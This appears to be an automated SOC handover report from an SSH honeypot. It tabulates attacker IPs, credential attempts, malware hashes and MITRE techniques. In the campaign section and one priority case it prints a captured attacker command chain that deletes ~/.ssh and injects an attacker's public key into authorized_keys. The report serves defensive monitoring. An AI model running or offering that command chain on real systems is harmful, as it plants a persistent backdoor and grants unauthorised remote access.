# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-27 |
| **Generated At** | 2026-03-27T14:47:18Z |
| **Shift Time** | 14:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **38** |
| False Positives Filtered | **8** (17.4%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **10** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **43** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **19** |
| Unique Usernames | **11** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 3 |
| `nobody` | 3 |
| `root` | 3 |
| `Config` | 2 |
| `operator` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin2013` | 1 |
| `nobody2017` | 1 |
| `1234567` | 1 |
| `P@ssw0rd` | 1 |
| `` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin2013` | 1 |
| `nobody` | `nobody2017` | 1 |
| `Config` | `1234567` | 1 |
| `guest` | `P@ssw0rd` | 1 |
| `GET / HTTP/1.0` | `` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `insecure` | `221.153.12.93` | 2026-03-27T14:12:05 |
| `root` | `765765` | `183.36.126.68` | 2026-03-27T14:32:34 |
| `root` | `3245gs5662d34` | `183.36.126.68` | 2026-03-27T14:32:44 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.36.126.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS212512` | Detai Prosperous Technologies Limited | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d3cee6bf9d3a

| Field | Detail |
|---|---|
| **Source IP** | `221.153.12[.]93` |
| **First Seen** | 2026-03-27 14:12 |
| **Last Seen** | 2026-03-27 14:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 14:12:02` | `cowrie.session.connect` |
| `2026-03-27 14:12:03` | `cowrie.client.version` |
| `2026-03-27 14:12:03` | `cowrie.client.kex` |
| `2026-03-27 14:12:05` | `cowrie.login.success` |
| `2026-03-27 14:12:06` | `cowrie.direct-tcpip.request` |
| `2026-03-27 14:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.153.12[.]93` to AbuseIPDB if not already reported
- [ ] Block `221.153.12[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f40c19f5d8

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-03-27 14:32 |
| **Last Seen** | 2026-03-27 14:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 14:32:33` | `cowrie.session.connect` |
| `2026-03-27 14:32:33` | `cowrie.client.version` |
| `2026-03-27 14:32:33` | `cowrie.client.kex` |
| `2026-03-27 14:32:34` | `cowrie.login.success` |
| `2026-03-27 14:32:34` | `cowrie.session.params` |
| `2026-03-27 14:32:34` | `cowrie.command.input` |
| `2026-03-27 14:32:34` | `cowrie.command.failed` |
| `2026-03-27 14:32:35` | `cowrie.log.closed` |
| `2026-03-27 14:32:35` | `cowrie.session.params` |
| `2026-03-27 14:32:35` | `cowrie.command.input` |
| `2026-03-27 14:32:35` | `cowrie.session.file_download` |
| `2026-03-27 14:32:35` | `cowrie.log.closed` |
| `2026-03-27 14:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c66c6022ec7

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-03-27 14:32 |
| **Last Seen** | 2026-03-27 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-27 14:32:43` | `cowrie.session.connect` |
| `2026-03-27 14:32:43` | `cowrie.client.version` |
| `2026-03-27 14:32:43` | `cowrie.client.kex` |
| `2026-03-27 14:32:44` | `cowrie.login.success` |
| `2026-03-27 14:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `202.98.62[.]60` | **4** | 2026-03-27 13:23 | 2026-03-27 13:23 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `172.236.228[.]227` | **3** | 2026-03-27 13:32 | 2026-03-27 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **2** | 2026-03-27 14:01 | 2026-03-27 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.241.126[.]187` | **2** | 2026-03-27 13:19 | 2026-03-27 13:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.15.4[.]95` | **2** | 2026-03-27 13:29 | 2026-03-27 13:34 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-03-27 14:11 | 2026-03-27 14:12 | 11s | 0 | `T1592` | 🟢 LOW |
| `117.247.239[.]202` | 1 | 2026-03-27 13:08 | 2026-03-27 13:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.66.236[.]9` | 1 | 2026-03-27 14:43 | 2026-03-27 14:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `122.144.14[.]204` | 1 | 2026-03-27 13:49 | 2026-03-27 13:49 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.187.230[.]130` | 1 | 2026-03-27 14:39 | 2026-03-27 14:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.104[.]208` | 1 | 2026-03-27 14:18 | 2026-03-27 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.129.31[.]42` | 1 | 2026-03-27 13:38 | 2026-03-27 13:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.60.128[.]241` | 1 | 2026-03-27 13:51 | 2026-03-27 13:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.236[.]104` | 1 | 2026-03-27 14:29 | 2026-03-27 14:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.236[.]87` | 1 | 2026-03-27 13:31 | 2026-03-27 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-03-27 14:32 | 2026-03-27 14:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.222.55[.]187` | 1 | 2026-03-27 13:58 | 2026-03-27 13:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.115.191[.]84` | 1 | 2026-03-27 13:28 | 2026-03-27 13:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.4.156[.]254` | 1 | 2026-03-27 13:35 | 2026-03-27 13:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-03-27 13:32 | 2026-03-27 13:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-03-27 14:32 | 2026-03-27 14:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.236.2[.]238` | 1 | 2026-03-27 13:54 | 2026-03-27 13:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.17.6[.]119` | 1 | 2026-03-27 14:09 | 2026-03-27 14:09 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-03-27 14:32 | 2026-03-27 14:32 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.8.91[.]187` | 1 | 2026-03-27 14:29 | 2026-03-27 14:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.106.239[.]86` | 1 | 2026-03-27 13:10 | 2026-03-27 13:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.82.70[.]133` | 1 | 2026-03-27 13:40 | 2026-03-27 13:40 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.144.14[.]204` | BD | Internet Service Provider | **100** ⚠️ | 36 |
| `58.17.6[.]119` | CN | China Unicom Jiangxi province network | **100** ⚠️ | 50 |
| `45.33.14[.]5` | US | Linode | **100** ⚠️ | 50 |
| `47.236.2[.]238` | SG | Alibaba Cloud LLC | **100** ⚠️ | 17 |
| `59.8.91[.]187` | KR | Jeonnambonbujang | **100** ⚠️ | 5 |
| `45.33.109[.]18` | US | Linode | **100** ⚠️ | 50 |
| `180.76.104[.]208` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 20 |
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 1 |
| `117.247.239[.]202` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 44 |
| `183.36.126[.]68` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 26 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (17.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 27 recon entry/entries in table (5 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T14:47:18Z_
